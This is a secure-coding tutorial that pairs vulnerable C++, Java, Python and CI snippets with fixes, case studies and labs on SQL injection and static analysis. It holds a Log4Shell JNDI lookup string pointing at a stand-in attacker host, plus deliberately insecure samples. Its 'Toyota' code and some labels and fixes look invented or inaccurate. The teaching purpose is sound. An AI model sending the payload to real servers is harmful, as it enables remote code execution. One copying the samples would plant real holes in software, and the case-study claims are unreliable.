Four Code Paths to Catastrophe

1. C++ Buffer Overflow

Vulnerable Code:

void setTemp(char* input) {
  char buffer[32];
  strcpy(buffer, input); // No bounds checking!
}

Exploit Logic: strcpy() lacks bounds checking, allowing attackers to overflow the stack and overwrite the return address, leading to Remote Code Execution (RCE).

Secure Fix:

void setTemp(const char* input) {
  char buffer[32] = {0};
  strncpy(buffer, input, sizeof(buffer)-1); // Safe copy
  buffer[sizeof(buffer)-1] = '\0'; // Guaranteed null-termination
}

2. Java Deserialization Attack (Log4j / JNDI Injection)

Vulnerable Config:

# log4j.properties
log4j.appender.CONSOLE.layout.ConversionPattern=%m%n

Exploit Logic: Unvalidated user input containing ${jndi:ldap://attacker.com} triggers JNDI lookup, loading a remote class that executes arbitrary code.

Secure Fix: Upgrade to Log4j 2.17.0+ and disable lookups with log4j2.formatMsgNoLookups=true

3. Python Pickle RCE

Vulnerable Code:

import pickle
model = pickle.load(open("user_model.pkl", "rb")) # Untrusted input!

Exploit Logic: Pickle can execute arbitrary Python objects via __reduce__ method, allowing OS-level command execution.

Secure Fix: Avoid unpickling untrusted files; use Joblib, JSON, or protobuf instead.

4. YAML Secrets Leak

Vulnerable YAML:

env:
  DB_PASS: ${{ secrets.PRODUCTION_PASSWORD }}

steps:
  - run: echo $DB_PASS # Accidentally logs secret!

Exploit Logic: Secrets get echoed to CI logs, which in public repos can be scraped by attackers.

Secure Fix:

steps:
  - name: Deploy (no secret echo)
    run: echo "Deploying..."
    env:
      DB_PASS: ${{ secrets.PRODUCTION_PASSWORD }}

Case Study: The Toyota Death Code

Vulnerable Code:

void throttleControl(char* input) {
  char buffer[32];
  strcpy(buffer, input); // Buffer overflow gateway
}

Impact:

  • 89 fatalities from uncontrolled acceleration
  • $1.2B fine + 8M vehicle recalls
  • Root Cause: No bounds checking + race conditions

Secure Refactor:

void throttleControl(const char* input) {
  char buffer[32] = {0};
  strncpy(buffer, input, sizeof(buffer)-1); // Safe copy
  buffer[sizeof(buffer)-1] = '\0'; // Guaranteed null-termination
}
"Hardware fails. Software must not."
🚦

Smart City Traffic Light DoS

Vulnerable Python:

import threading
flag = True # Global mutable state

def switch_light():
  while flag: # Stale reads possible
    pass

Impact: City gridlock from frozen intersections, 911 call surge due to emergency vehicle delays.

Thread-Safe Fix:

import threading
flag = threading.Event() # Atomic operations
flag.set()

def switch_light():
  while flag.is_set(): # Thread-safe check
    pass
"Shared state is the enemy. Immutability is salvation."

Lab 1: Secure the Java App

Objective: Patch real-world Spring Boot code vulnerable to SQL Injection and Cross-Site Scripting (XSS).

Vulnerable Sample Code:

@GetMapping("/search")
public String getUser(@RequestParam String name) {
  String query = "SELECT * FROM users WHERE name = '" + name + "'";
  return jdbcTemplate.queryForObject(query, String.class);
}

What's Wrong:

  • Unescaped user input → SQLi risk
  • Raw response injection → XSS risk on UI rendering

Secure Refactor:

@GetMapping("/search")
public String getUser(@RequestParam String name) {
  String query = "SELECT * FROM users WHERE name = ?";
  return jdbcTemplate.queryForObject(query, new Object[]{name}, String.class);
}

Lab 2: CI/CD Hardening with Clang + Semgrep

Objective: Build a lightweight but powerful Secure CI/CD pipeline that detects C++ security flaws on commit.

Tool Purpose
Clang Compile-time code analyzer
Semgrep AST-based security rule scanner

CI Pipeline Setup:

# Install Clang
sudo apt install clang clang-tools -y

# Run Static Analyzer
scan-build make

# Install & Run Semgrep
pip install semgrep
semgrep init
semgrep --config=p/ci --lang=c++ .

GitHub Actions Workflow:

name: Secure Build

on: [push]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run Clang Static Analyzer
        run: scan-build make
      - name: Run Semgrep Security Rules
        run: semgrep --config=p/ci --lang=c++ .
